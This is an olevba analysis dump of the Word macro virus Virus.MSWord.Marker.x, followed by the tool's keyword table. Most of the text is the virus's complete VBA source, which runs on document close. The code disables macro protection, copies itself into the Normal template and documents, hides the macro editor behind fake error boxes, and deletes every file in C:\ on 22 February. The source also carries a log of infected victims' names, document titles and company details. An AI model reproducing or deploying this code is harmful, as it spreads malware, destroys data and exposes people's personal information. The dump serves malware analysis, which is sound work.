olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.x-f3ec7a960e226d466df8ee19946a3f3a8ea6c409
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.x-f3ec7a960e226d466df8ee19946a3f3a8ea6c409 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 












































' Gemma CEBO1.DOT1/10/99 13:24:27
Private Sub Document_Close()
' Gemma CEBO1.DOT1/10/99 13:24:27
On Error Resume Next
' Gemma CEBO1.DOT1/10/99 13:24:27
Const from = "Yugoslavia" 'nuthin' to do with the GeNiUs just needed a marker
' Gemma CEBO1.DOT1/10/99 13:24:27
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
' Gemma CEBO1.DOT1/10/99 13:24:27
Dim ad, nt As Object
' Gemma CEBO1.DOT1/10/99 13:24:27
Dim rep, x As Integer
' Gemma CEBO1.DOT1/10/99 13:24:27
Dim virusCode, UserAddress, LogData, LogFile As String
' Gemma CEBO1.DOT1/10/99 13:24:27
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
' Gemma CEBO1.DOT1/10/99 13:24:27
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)
' Gemma CEBO1.DOT1/10/99 13:24:27
DocumentInfected = ad.codemodule.Find(from, 1, 1, 10000, 10000)
' Gemma CEBO1.DOT1/10/99 13:24:27
NormalTemplateInfected = nt.codemodule.Find(from, 1, 1, 10000, 10000)
' Gemma CEBO1.DOT1/10/99 13:24:27
Options.VirusProtection = False
' Gemma CEBO1.DOT1/10/99 13:24:27
Options.SaveNormalPrompt = True
' Gemma CEBO1.DOT1/10/99 13:24:27
Delivery:
' Gemma CEBO1.DOT1/10/99 13:24:27
If Day(Now()) = 22 And Month(Now()) = 2 Then
' Gemma CEBO1.DOT1/10/99 13:24:27
Kill "C:\*.*":
' Gemma CEBO1.DOT1/10/99 13:24:27
rep = MsgBox("That's Right", vbOK + vbCritical, "It's Murder")
' Gemma CEBO1.DOT1/10/99 13:24:27
GoTo Delivery
' Gemma CEBO1.DOT1/10/99 13:24:27
End If
' Gemma CEBO1.DOT1/10/99 13:24:27
If (DocumentInfected = True Xor NormalTemplateInfected = True) And (ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate) Then
' Gemma CEBO1.DOT1/10/99 13:24:27
If DocumentInfected = True Then
' Gemma CEBO1.DOT1/10/99 13:24:27
SaveNormalTemplate = NormalTemplate.Saved
' Gemma CEBO1.DOT1/10/99 13:24:27
virusCode = ad.codemodule.Lines(1, ad.codemodule.countoflines)
' Gemma CEBO1.DOT1/10/99 13:24:27
For i = 1 To Len(Application.UserAddress)
' Gemma CEBO1.DOT1/10/99 13:24:27
If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
' Gemma CEBO1.DOT1/10/99 13:24:27
If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
' Gemma CEBO1.DOT1/10/99 13:24:27
UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
' Gemma CEBO1.DOT1/10/99 13:24:27
End If
' Gemma CEBO1.DOT1/10/99 13:24:27
Else
' Gemma CEBO1.DOT1/10/99 13:24:27
UserAddress = UserAddress & Chr(13) & "' "
' Gemma CEBO1.DOT1/10/99 13:24:27
End If
' Gemma CEBO1.DOT1/10/99 13:24:27
Next i
' Gemma CEBO1.DOT1/10/99 13:24:27
LogData = Chr(13) & "' " & Format(Time, "hh:mm:ss AMPM -") & Format(Date, "dddd,d mmm,yyyy") & Chr(13) & "' " & Application.UserName & Chr(13) & "' " & UserAddress & Chr(13) & "' " & Application.ActiveDocument & Chr(13)
' Gemma CEBO1.DOT1/10/99 13:24:27
virusCode = virusCode & LogData
' Gemma CEBO1.DOT1/10/99 13:24:27
nt.codemodule.Deletelines 1, nt.codemodule.countoflines
' Gemma CEBO1.DOT1/10/99 13:24:27
nt.codemodule.AddFromString virusCode
' Gemma CEBO1.DOT1/10/99 13:24:27
With nt.codemodule
' Gemma CEBO1.DOT1/10/99 13:24:27
.replaceline 174, "Sub viewVBcode()" & Chr(13) & Chr(13) & "x=Msgbox(" & Chr(34) & " Error - Not enough memory!" & Chr(34) & ", VbOkonly + VbApplication+Vbcritical," & Chr(34) & "Visual Basic Editor" & Chr(34) & ")" & Chr(13) & Chr(13) & "End Sub" & Chr(13) & Chr(13) & "Sub ToolsMacro()" & Chr(13) & Chr(13) & "x=Msgbox(" & Chr(34) & " Error - Not enough memory!" & Chr(34) & ", VbOkonly + VbApplication+Vbcritical," & Chr(34) & "Visual Basic Editor" & Chr(34) & ")" & Chr(13) & Chr(13) & "End Sub"
' Gemma CEBO1.DOT1/10/99 13:24:27
End With
' Gemma CEBO1.DOT1/10/99 13:24:27
With nt.codemodule
' Gemma CEBO1.DOT1/10/99 13:24:27
For x = 45 To 181 Step 2
' Gemma CEBO1.DOT1/10/99 13:24:27
.replaceline x, "' " & Application.UserName & " " & Application.ActiveDocument & Now & Application.ActivePrinter
' Gemma CEBO1.DOT1/10/99 13:24:27
Next x
' Gemma CEBO1.DOT1/10/99 13:24:27
End With
' Gemma CEBO1.DOT1/10/99 13:24:27
If SaveNormalTemplate = True Then NormalTemplate.Save
' Gemma CEBO1.DOT1/10/99 13:24:27
End If
' Gemma CEBO1.DOT1/10/99 13:24:27
If NormalTemplateInfected = True Then
' Gemma CEBO1.DOT1/10/99 13:24:27
SaveDocument = ActiveDocument.Saved
' Gemma CEBO1.DOT1/10/99 13:24:27
virusCode = nt.codemodule.Lines(1, nt.codemodule.countoflines) & Chr(13) & "' " & Application.ActiveDocument & Chr(13)
' Gemma CEBO1.DOT1/10/99 13:24:27
ad.codemodule.Deletelines 1, ad.codemodule.countoflines
' Gemma CEBO1.DOT1/10/99 13:24:27
ad.codemodule.AddFromString virusCode
' Gemma CEBO1.DOT1/10/99 13:24:27
nt.codemodule.Deletelines 1, nt.codemodule.countoflines
' Gemma CEBO1.DOT1/10/99 13:24:27
nt.codemodule.AddFromString virusCode
' Gemma CEBO1.DOT1/10/99 13:24:27
ad.codemodule.Deletelines 174, 13
' Gemma CEBO1.DOT1/10/99 13:24:27
With ad.codemodule
' Gemma CEBO1.DOT1/10/99 13:24:27
For x = 45 To 181 Step 2
' Gemma CEBO1.DOT1/10/99 13:24:27
.replaceline x, "' " & Application.UserName & " " & Application.ActiveDocument & Now & Application.ActivePrinter
' Gemma CEBO1.DOT1/10/99 13:24:27
Next x
' Gemma CEBO1.DOT1/10/99 13:24:27
End With
' Gemma CEBO1.DOT1/10/99 13:24:27
If SaveDocument = True Then ActiveDocument.Save
' Gemma CEBO1.DOT1/10/99 13:24:27
End If
' Gemma CEBO1.DOT1/10/99 13:24:27
End If
' Gemma CEBO1.DOT1/10/99 13:24:27
Options.SaveNormalPrompt = False
' Gemma CEBO1.DOT1/10/99 13:24:27
End Sub
' Gemma CEBO1.DOT1/10/99 13:24:27
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
' Gemma CEBO1.DOT1/10/99 13:24:27
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
' Gemma CEBO1.DOT1/10/99 13:24:27
' WildList SAMPLE1.DOC9/15/99 6:49:59 PM
' Gemma CEBO1.DOT1/10/99 13:24:27
' Document1
' Gemma CEBO1.DOT1/10/99 13:24:27
' Document1

' Document1

' details.doc

' Resume.doc

' div.doc

' 05:08:00 PM -Monday,24 May,1999
' Siu Pang
'
' div.doc

' beatrix_kwan.doc

' slee.doc

' CV981125.doc

' MassoudW97.doc

' S4R_Int.doc

' Hotlist1.doc

' Roy Zornow resume.doc

' TK Move Manager.doc

' AU Business Manager.doc

' GDLUCK.DOC

' NOMURA.doc

' Operations Generalist.doc

' PBX Telecom Coordinator.doc

' resume.doc

' parm_meegada.doc

' Pramit.doc

' 03:29:30 PM -Thursday,27 May,1999
' Employee
'
' panda.doc

' zendeal2.doc

' Resume34.doc

' ted r doc_.doc

' gurman.doc

' RESUME37.doc

' Paul Smith002.doc

' WANG-W.DOC

' 1resumeAGurman.doc

' Chuck-res.doc

' cv3.doc

' resume38.doc

' BHARG-V.DOC

' flres1.doc

' sample1.doc

' Lawton updated resume.doc

' LEMERISE.DOC

' galianes.doc

' CVUK.doc

' word95_BinLi.doc

' Eduard 1.doc

' rakowski.doc

' DHRUVER.DOC

' 01:08:39 PM -Wednesday,16 Jun,1999
' DhruveR
'
' Dhruver.doc

' 6-15.doc

' DJI RESTORE.doc

' 03:58:39 PM -Wednesday,16 Jun,1999
' Tom Dziubek
'
' DJI RESTORE.doc

' FEC Script.doc

' OutlookDelegates.doc

' nite.doc

' sbranc01.doc

' newuser-djxpress.doc

' june_99.doc

' 02:01:37 PM -Monday,28 Jun,1999
' TozziT
'
' june_99.doc

' teammov1.doc

' 03:34:41 PM -Wednesday,7 Jul,1999
' DziubekT
'
' teammov11.doc

' Document2

' oneweek.doc

' oneweek.doc

' Document1

' twoweek.doc

' 4week.doc

' 01:44:35 PM -Wednesday,7 Jul,1999
' Ernesto Dulce
'
' 4week.doc

' FSDLA.doc

' FSDLA.doc

' July 13th Outage Request.doc

' 12:14:22 PM -Monday,12 Jul,1999
' cnsncc
'
' July 13th Outage Request.doc

' Kathy's Resume1.doc

' ubeedoo.doc

' Unregistered Network Numbers.doc

' servernames.doc

' data circuits 1.doc

' DAILY ACTIVITY REPORT.doc

' 07:56:46 AM -Tuesday,13 Jul,1999
' Donna Gusty
'
' DAILY ACTIVITY REPORT.doc

' BCP Status 2.doc

' Pouch update 7-99.doc

' Customer Service Analyst.doc

' Shadow R4.doc

' DOR July 13 1999.doc

' Customer Service Analyst.doc

' Disaster Recovery Consultant revised.doc

' helpadminminutes.doc

' Security Technician.doc

' Security Consultant.doc

' Memo review for flag1.doc

' ISDN_Announcement1.doc

' Technical Competencie1.doc

' Doc3.doc

' Doc1_.doc

' Technical Security Group agenda 5-26-99.doc

' QuickConnection and Feedback-usethis.doc

' desktop guideline memo - test.doc

' Atex Meetings.doc

' Internet Services.doc

' Advertising.doc

' DJPortal.doc

' DJIP.doc

' NonBCPGroups.doc

' July3Keane.doc

' DOW JONES PROP msw 6.0.doc

' Pagination ISCS Plan Requirements.doc

' NASC 6-30-99 Meeting.doc

' intern'lfeedscpl__.doc

' Mtg0707.doc

' Memo9714.doc

' Newswires mail solution.doc

' ScanningMEMORANDUM.doc

' Pagination ISCS Plan Requirements.doc

' Pagination Security & Contingency issues.doc

' 6-24 Policy minutes.doc

' article1.doc

' Initial_assumpt.doc

' shared_service_sum.doc

' ScanningMEMORANDUM.doc

' Career Path Matrix-revised.doc

' Career Path Matrix-revised2.doc

' Career Path Matrix-revised.doc

' Summary paragraphs.doc

' security admin analyst.doc

' Customer Service Analyst.doc

' Summary paragraphs1_.doc

' Doc1_.doc

' DJXPress Rollout remote access methods.doc

' MEMORANDUMfirewall-model.doc

' toronto.doc

' MtgSchedule_.doc

' 7-19-99.doc

' Summary paragraphs1_.doc

' 103a.doc

' Pouch update 7-99.doc

' Pouch update 7-99.doc

' Pouch update 7-99_tom.doc

' Pouch update 7-99.doc

' 07:38:52 AM -Wednesday,21 Jul,1999
' Robert D. Gardner
'
' Pouch update 7-99.doc

' ELAC Nautik Report03b.doc

' L3 ELAC Nautik Phase01.doc

' L3_EuroAtlas Phase01.doc

' L3_JovyAtlas Phase01.doc

' 10:37:26 AM -Wednesday,21 Jul,1999
' Pc Support
'
' L3_JovyAtlas Phase01.doc

' L3SELFPres.doc

' 05:06:37 PM -Wednesday,21 Jul,1999
' Rocco R. Ruggiero
'
' l3slfprs.doc

' l3nmwfnl.doc

' l3nmefnl.doc

' absaufnl.doc

' 0920PBX.DOC

' CS-E Phase II Audit.doc

' lo10q2qc.doc

' LO0715MN.doc

' 02:26:07 PM -Friday,10 Sep,1999
' NoWork Inc.
'
' Virus Test.doc

' Doc1.doc

' 06:49:44 PM -Wednesday,15 Sep,1999
' WildList
'
' doc1.doc

' SAMPLE1.DOC

' 01:22:32  -viernes,1 oct,1999
' Gemma
'
' W7MARK-X.doc

' CEBO4.DOT

' CEBO3.DOT

' CEBO2.DOT

' CEBO1.DOT

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

